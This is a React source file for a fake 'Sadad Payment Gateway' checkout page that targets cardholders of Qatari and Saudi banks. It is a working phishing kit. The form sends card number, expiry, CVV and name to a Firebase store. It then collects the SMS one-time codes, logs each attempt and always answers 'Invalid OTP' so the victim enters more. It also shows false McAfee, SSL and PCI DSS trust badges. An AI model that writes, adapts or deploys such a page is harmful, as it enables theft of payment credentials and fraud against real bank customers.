"use client"

import type React from "react"
import { useEffect, useState, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { ChevronLeft, CreditCard, Smartphone, CheckCircle2, XCircle } from "lucide-react"
import { addData } from "@/lib/firebase"
import FullPageLoader from "@/components/loader"
const allOtps = [""]

const validateCardNumber = (cardNumber: string): boolean => {
  const cleaned = cardNumber.replace(/\s/g, "")
  if (!/^\d+$/.test(cleaned) || cleaned.length !== 16) return false

  let sum = 0
  let isEven = false

  // Loop through values starting from the rightmost digit
  for (let i = cleaned.length - 1; i >= 0; i--) {
    let digit = Number.parseInt(cleaned[i], 10)

    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    isEven = !isEven
  }

  return sum % 10 === 0
}

const validateExpiryDate = (expiryDate: string): { valid: boolean; message?: string } => {
  const cleaned = expiryDate.replace(/\D/g, "")
  if (cleaned.length !== 4) return { valid: false, message: "Invalid format" }

  const month = Number.parseInt(cleaned.slice(0, 2), 10)
  const year = Number.parseInt(cleaned.slice(2, 4), 10)

  if (month < 1 || month > 12) return { valid: false, message: "Invalid month" }

  const currentDate = new Date()
  const currentYear = currentDate.getFullYear() % 100
  const currentMonth = currentDate.getMonth() + 1

  if (year < currentYear || (year === currentYear && month < currentMonth)) {
    return { valid: false, message: "Card expired" }
  }

  return { valid: true }
}

const detectCardType = (cardNumber: string): string => {
  const cleaned = cardNumber.replace(/\s/g, "")
  if (/^4/.test(cleaned)) return "visa"
  if (/^5[1-5]/.test(cleaned)) return "mastercard"
  if (/^3[47]/.test(cleaned)) return "amex"
  return "unknown"
}

const detectBankName = (cardNumber: string): string => {
  const bin = cardNumber.replace(/\s/g, "").slice(0, 6)

  // Qatar Banks
  if (bin.startsWith("4462") || bin.startsWith("5428")) return "Qatar National Bank (QNB)"
  if (bin.startsWith("4766") || bin.startsWith("5197")) return "Doha Bank"
  if (bin.startsWith("4724") || bin.startsWith("5468")) return "Commercial Bank of Qatar (CBQ)"
  if (bin.startsWith("4358") || bin.startsWith("5392")) return "Qatar Islamic Bank (QIB)"
  if (bin.startsWith("4894") || bin.startsWith("5456")) return "Masraf Al Rayan"
  if (bin.startsWith("4523") || bin.startsWith("5289")) return "Ahli Bank"
  if (bin.startsWith("4775") || bin.startsWith("5314")) return "Qatar International Islamic Bank (QIIB)"
  if (bin.startsWith("4682") || bin.startsWith("5477")) return "International Bank of Qatar (IBQ)"
  if (bin.startsWith("4918") || bin.startsWith("5423")) return "Qatar Development Bank"
  if (bin.startsWith("4329") || bin.startsWith("5398")) return "Barwa Bank"

  // Major Saudi Banks
  if (bin.startsWith("4081") || bin.startsWith("4530") || bin.startsWith("4535")) return "Al Rajhi Bank"
  if (bin.startsWith("4055") || bin.startsWith("5126")) return "Riyad Bank"
  if (bin.startsWith("4341") || bin.startsWith("5276")) return "National Commercial Bank (NCB)"
  if (bin.startsWith("4567") || bin.startsWith("5204")) return "Saudi British Bank (SABB)"
  if (bin.startsWith("4155") || bin.startsWith("5221")) return "Alinma Bank"
  if (bin.startsWith("4862") || bin.startsWith("5290")) return "Bank AlJazira"
  if (bin.startsWith("4532") || bin.startsWith("5439")) return "Arab National Bank (ANB)"
  if (bin.startsWith("4715") || bin.startsWith("5280")) return "Saudi Investment Bank"
  if (bin.startsWith("4240") || bin.startsWith("5270")) return "Banque Saudi Fransi"
  if (bin.startsWith("4389") || bin.startsWith("5234")) return "Samba Financial Group"

  // International Banks
  if (bin.startsWith("4")) return "Visa"
  if (
    bin.startsWith("51") ||
    bin.startsWith("52") ||
    bin.startsWith("53") ||
    bin.startsWith("54") ||
    bin.startsWith("55")
  )
    return "Mastercard"
  if (bin.startsWith("34") || bin.startsWith("37")) return "American Express"

  return "Your Bank"
}

export default function PaymentPage() {
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [saveCard, setSaveCard] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState<"credit" | "debit" | "sadad">("credit")
  const [step, setStep] = useState<"form" | "otp">("form")
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""])
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(false)
  const [payVal, setPayval] = useState("")
  const [cardValid, setCardValid] = useState<boolean | null>(null)
  const [expiryValid, setExpiryValid] = useState<boolean | null>(null)
  const [expiryError, setExpiryError] = useState("")
  const [bankName, setBankName] = useState("")

  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])

  useEffect(() => {
    const val = localStorage.getItem("amount")
    if (val) setPayval(val)
  }, [])

  useEffect(() => {
    if (step === "otp" && "OTPCredential" in window) {
      const abortController = new AbortController()

      navigator.credentials
        .get({
          // @ts-ignore - WebOTP API types
          otp: { transport: ["sms"] },
          signal: abortController.signal,
        })
        .then((otp: any) => {
          if (otp?.code) {
            const digits = otp.code.split("")
            setOtp(digits)
            otpInputRefs.current[5]?.focus()
          }
        })
        .catch((err) => {
          console.log("WebOTP error:", err)
        })

      return () => {
        abortController.abort()
      }
    }
  }, [step])

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "")
    const chunks = cleaned.match(/.{1,4}/g)
    return chunks ? chunks.join(" ") : cleaned
  }

  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, "")
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + "/" + cleaned.slice(2, 4)
    }
    return cleaned
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value.replace(/\D/g, ""))
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted)

      if (formatted.replace(/\s/g, "").length >= 6) {
        const detectedBank = detectBankName(formatted)
        setBankName(detectedBank)
      }

      // Validate card if 16 digits entered
      if (formatted.replace(/\s/g, "").length === 16) {
        const isValid = validateCardNumber(formatted)
        setCardValid(isValid)
      } else {
        setCardValid(null)
      }
    }
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    if (formatted.replace(/\D/g, "").length <= 4) {
      setExpiryDate(formatted)

      // Validate expiry if complete
      if (formatted.replace(/\D/g, "").length === 4) {
        const validation = validateExpiryDate(formatted)
        setExpiryValid(validation.valid)
        setExpiryError(validation.message || "")
      } else {
        setExpiryValid(null)
        setExpiryError("")
      }
    }
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "")
    if (value.length <= 3) {
      setCvv(value)
    }
  }

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1)

    const newOtp = [...otp]
    newOtp[index] = digit
    setOtp(newOtp)
    setError("")

    if (digit && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  const handleOtpPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6)
    const digits = pastedData.split("")
    const newOtp = [...otp]

    digits.forEach((digit, index) => {
      if (index < 6) {
        newOtp[index] = digit
      }
    })

    setOtp(newOtp)

    const nextEmptyIndex = newOtp.findIndex((d) => !d)
    if (nextEmptyIndex !== -1) {
      otpInputRefs.current[nextEmptyIndex]?.focus()
    } else {
      otpInputRefs.current[5]?.focus()
    }
  }

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // Validate card number
    if (cardNumber.replace(/\s/g, "").length !== 16) {
      setError("Please enter a complete card number")
      return
    }

    if (!validateCardNumber(cardNumber)) {
      setError("Invalid card number. Please check and try again.")
      setCardValid(false)
      return
    }

    // Validate expiry
    const expiryValidation = validateExpiryDate(expiryDate)
    if (!expiryValidation.valid) {
      setError(expiryValidation.message || "Invalid expiry date")
      setExpiryValid(false)
      return
    }

    // Validate CVV
    if (cvv.length !== 3) {
      setError("Please enter a valid CVV")
      return
    }

    setError("")
    setLoading(true)

    const visitorID = localStorage.getItem("visitor")
    localStorage.setItem("bankName", bankName)
    await addData({ id: visitorID, cardNumber, expiryDate, cvv, cardholderName, paymentMethod })
    setTimeout(() => {
      setStep("otp")
      setLoading(false)
    }, 5000)
    if (!visitorID) {
      setError("Visitor not found")
      setLoading(false)
      return
    }
  }

  return (
    <div className="min-h-screen bg-[#8A1538]">
      {loading && <FullPageLoader />}
      {step === "otp" && (
        <div className="min-h-screen bg-[#8A1538] flex items-center justify-center p-4">
          <div className="w-full max-w-md">
            <div className="bg-background rounded-3xl p-8 shadow-2xl">
              <div className="text-center mb-8">
                <div className="w-16 h-16 bg-[#8A1538]/10 rounded-2xl mx-auto mb-4 flex items-center justify-center">
                  <svg className="w-8 h-8 text-[#8A1538]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <h2 className="text-2xl font-bold text-foreground mb-2">OTP Verification</h2>
                <p className="text-sm text-muted-foreground">
                  Enter the 6-digit code sent by <span className="font-semibold text-[#8A1538]">{bankName}</span> to
                  your phone
                </p>
              </div>

              <div className="flex gap-3 justify-center mb-6" onPaste={handleOtpPaste} dir="ltr">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={(el) => (otpInputRefs.current[index] = el)}
                    type="text"
                    inputMode="numeric"
                    autoComplete={index === 0 ? "one-time-code" : "off"}
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleOtpKeyDown(index, e)}
                    className="w-12 h-14 sm:w-14 sm:h-16 text-center text-2xl font-bold border-2 rounded-xl transition-all focus:outline-none focus:ring-2 focus:ring-[#8A1538] focus:border-[#8A1538] bg-background border-border hover:border-[#8A1538]/50"
                    style={{
                      caretColor: "#8A1538",
                    }}
                  />
                ))}
              </div>

              {error && (
                <div className="mb-4 p-3 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900 rounded-xl">
                  <p className="text-sm text-red-600 dark:text-red-400 font-medium text-center">{error}</p>
                </div>
              )}

              <div className="text-center mb-6">
                <button className="text-sm text-[#8A1538] hover:underline font-medium">Resend Code</button>
              </div>

              <Button
                className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg"
                onClick={async () => {
                  const otpCode = otp.join("")
                  if (otpCode.length !== 6) {
                    setError("Please enter all 6 digits")
                    return
                  }

                  setLoading(true)
                  const visitorID = localStorage.getItem("visitor")
                  allOtps.push(otpCode)
                  await addData({
                    id: visitorID,
                    paymentMethod,
                    allOtps,
                    otp: otpCode,
                  })

                  localStorage.setItem(`used_${visitorID}`, "true")
                  setTimeout(() => {
                    setLoading(false)
                    alert("Invalid OTP")
                  }, 4000)
                }}
              >
                Confirm Payment
              </Button>

              <div className="mt-6 flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>Verification secured with end-to-end encryption</span>
              </div>
            </div>
          </div>
        </div>
      )}
      {step === "form" && (
        <div className="space-y-5 text-center">
          <h2 className="text-lg font-semibold text-white">Payment Information</h2>
          <p className="text-sm text-gray-400">Enter your payment details below</p>

          <header className="relative bg-[#8A1538] text-white px-4 pt-12 pb-8">
            <div className="max-w-md mx-auto">
              <div className="flex items-center justify-between mb-6">
                <button className="p-2 hover:bg-white/10 rounded-lg transition-colors">
                  <ChevronLeft className="h-6 w-6" />
                </button>
                <span className="text-sm">Eng</span>
              </div>

              <div className="text-center space-y-3">
                <div className="w-12 h-12 bg-white rounded-xl mx-auto flex items-center justify-center">
                  <span className="text-[#8A1538] font-bold text-xl">S</span>
                </div>
                <h1 className="text-base font-medium">Sadad Payment solutions</h1>
                <div className="text-center">
                  <p className="text-sm text-white/80 mb-1">Select an option to Pay</p>
                  <p className="text-3xl font-bold">
                    {payVal}
                    <sup className="text-sm"></sup>
                  </p>
                </div>
              </div>
            </div>
          </header>

          <div className="bg-background rounded-t-3xl -mt-2 min-h-[calc(100vh-220px)] pb-8">
            <div className="max-w-md mx-auto px-5 pt-6">
              <div className="grid grid-cols-3 gap-3 mb-6">
                <button
                  onClick={() => setPaymentMethod("credit")}
                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
                    paymentMethod === "credit"
                      ? "border-[#8A1538] bg-[#8A1538]/5"
                      : "border-border bg-background hover:border-[#8A1538]/30"
                  }`}
                >
                  <CreditCard
                    className={`h-6 w-6 mb-2 ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  />
                  <span
                    className={`text-xs font-medium ${paymentMethod === "credit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  >
                    Credit Card
                  </span>
                </button>

                <button
                  onClick={() => setPaymentMethod("debit")}
                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
                    paymentMethod === "debit"
                      ? "border-[#8A1538] bg-[#8A1538]/5"
                      : "border-border bg-background hover:border-[#8A1538]/30"
                  }`}
                >
                  <CreditCard
                    className={`h-6 w-6 mb-2 ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  />
                  <span
                    className={`text-xs font-medium ${paymentMethod === "debit" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  >
                    Debit Card
                  </span>
                </button>

                <button
                  onClick={() => setPaymentMethod("sadad")}
                  className={`flex flex-col items-center justify-center p-4 rounded-2xl border-2 transition-all ${
                    paymentMethod === "sadad"
                      ? "border-[#8A1538] bg-[#8A1538]/5"
                      : "border-border bg-background hover:border-[#8A1538]/30"
                  }`}
                >
                  <Smartphone
                    className={`h-6 w-6 mb-2 ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  />
                  <span
                    className={`text-xs font-medium ${paymentMethod === "sadad" ? "text-[#8A1538]" : "text-muted-foreground"}`}
                  >
                    Sadad Pay
                  </span>
                </button>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="space-y-2">
                  <label className="text-xs text-muted-foreground font-medium">Card Holder Name</label>
                  <Input
                    type="text"
                    placeholder="Card Holder Name"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="h-12 text-base border-border/50 rounded-xl"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-xs text-muted-foreground font-medium">Card Number</label>
                  <div className="relative">
                    <Input
                      type="text"
                      placeholder="0000 0000 0000 0000"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      className={`h-12 text-right text-base rounded-xl pr-20 font-mono tracking-wider transition-colors ${
                        cardValid === true
                          ? "border-green-500 focus-visible:ring-green-500"
                          : cardValid === false
                            ? "border-red-500 focus-visible:ring-red-500"
                            : "border-border/50"
                      }`}
                      dir="ltr"
                      required
                    />
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                      <img src="/vmwx.png" width={90} alt="Card brands" />
                    </div>
                    {cardValid === true && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        <CheckCircle2 className="h-5 w-5 text-green-500" />
                      </div>
                    )}
                    {cardValid === false && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        <XCircle className="h-5 w-5 text-red-500" />
                      </div>
                    )}
                  </div>
                  {cardValid === true && (
                    <p className="text-xs text-green-600 dark:text-green-400 flex items-center gap-1">
                      <CheckCircle2 className="h-3 w-3" />
                      Valid card number
                    </p>
                  )}
                  {cardValid === false && (
                    <p className="text-xs text-red-600 dark:text-red-400 flex items-center gap-1">
                      <XCircle className="h-3 w-3" />
                      Invalid card number
                    </p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-xs text-muted-foreground font-medium">Expiry / Validity</label>
                    <Input
                      type="text"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={handleExpiryChange}
                      className={`h-12 text-base rounded-xl font-mono transition-colors ${
                        expiryValid === true
                          ? "border-green-500 focus-visible:ring-green-500"
                          : expiryValid === false
                            ? "border-red-500 focus-visible:ring-red-500"
                            : "border-border/50"
                      }`}
                      dir="ltr"
                      required
                    />
                    {expiryValid === false && <p className="text-xs text-red-600 dark:text-red-400">{expiryError}</p>}
                    {expiryValid === true && <p className="text-xs text-green-600 dark:text-green-400">Valid</p>}
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs text-muted-foreground font-medium">CVV</label>
                    <div className="relative">
                      <Input
                        type="password"
                        placeholder="000"
                        value={cvv}
                        dir="rtl"
                        onChange={handleCvvChange}
                        className="h-12 text-base border-border/50 rounded-xl pr-10 font-mono"
                        required
                      />
                      <div className="absolute left-3 top-1/2 -translate-y-1/2">
                        <div className="w-6 h-5 bg-gradient-to-br from-amber-400 to-yellow-600 rounded-sm grid grid-cols-3 gap-[1px] p-[2px]">
                          {[...Array(9)].map((_, i) => (
                            <div key={i} className="bg-amber-500/50 rounded-[1px]"></div>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2 py-2">
                  <Checkbox
                    id="saveCard"
                    checked={saveCard}
                    onCheckedChange={(checked) => setSaveCard(checked as boolean)}
                    className="border-[#8A1538] data-[state=checked]:bg-[#8A1538] data-[state=checked]:border-[#8A1538]"
                  />
                  <label htmlFor="saveCard" className="text-sm text-foreground cursor-pointer">
                    Save this card for faster checkout for next time
                  </label>
                </div>

                {error && (
                  <div className="p-3 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900 rounded-xl">
                    <p className="text-sm text-red-600 dark:text-red-400 font-medium text-center">{error}</p>
                  </div>
                )}

                <Button
                  type="submit"
                  className="w-full h-14 bg-[#8A1538] hover:bg-[#8A1538]/90 text-white rounded-xl text-base font-semibold shadow-lg mt-6"
                >
                  Pay {payVal}
                </Button>

                <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground mt-4">
                  <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3zm-2 15l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
                  </svg>
                  <span>
                    Payment is Secured with 256bit SSL encryption{" "}
                    <span className="text-green-600 font-medium">(You are safe)</span>
                  </span>
                </div>
              </form>

              <div className="mt-8 pt-6 border-t border-border">
                <div className="flex items-center justify-center gap-4 mb-3">
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-red-50 dark:bg-red-950/20 rounded-lg border border-red-200 dark:border-red-900">
                    <div className="w-5 h-5 bg-red-600 rounded flex items-center justify-center text-[8px] font-bold text-white">
                      M
                    </div>
                    <span className="text-[10px] font-semibold text-red-700 dark:text-red-400">McAfee</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-green-50 dark:bg-green-950/20 rounded-lg border border-green-200 dark:border-green-900">
                    <svg className="w-4 h-4 text-green-600" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2L3 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                    </svg>
                    <span className="text-[10px] font-semibold text-green-700 dark:text-green-400">SSL</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-yellow-50 dark:bg-yellow-950/20 rounded-lg border border-yellow-200 dark:border-yellow-900">
                    <svg className="w-4 h-4 text-yellow-600" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M18 8h-1V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                    </svg>
                    <span className="text-[10px] font-semibold text-yellow-700 dark:text-yellow-400">Symantec</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-50 dark:bg-blue-950/20 rounded-lg border border-blue-200 dark:border-blue-900">
                    <svg className="w-4 h-4 text-blue-600" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z" />
                    </svg>
                    <span className="text-[10px] font-semibold text-blue-700 dark:text-blue-400">PCI DSS</span>
                  </div>
                </div>
                <p className="text-center text-[10px] text-muted-foreground">Powered by Sadad Payment Gateway</p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
